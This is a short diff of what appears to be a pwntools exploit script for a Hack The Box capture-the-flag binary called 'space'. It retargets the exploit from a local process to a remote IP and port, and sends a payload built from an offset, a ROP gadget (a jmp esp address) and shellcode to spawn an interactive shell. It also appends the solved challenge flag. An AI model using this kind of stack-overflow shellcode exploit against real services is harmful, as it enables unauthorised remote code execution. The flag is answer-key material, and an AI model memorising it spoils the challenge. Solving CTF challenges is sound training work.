@@ -17,9 +17,9 @@ checksec --file ./space
 #cyclic
 #offset = 18
 
-io = process('./space')
-#ip, port = 
-#io = remote(ip, port)
+#io = process('./space')
+ip, port = '138.68.155.111', 32347
+io = remote(ip, port)
 
 #0x0804919f jmp esp
 
@@ -64,3 +64,5 @@ shellcode = offset+rop+shell
 io.recvuntil('>')
 io.sendline(shellcode)
 io.interactive()
+
+#HTB{sh3llc0de_1n_7h3_5p4c3}
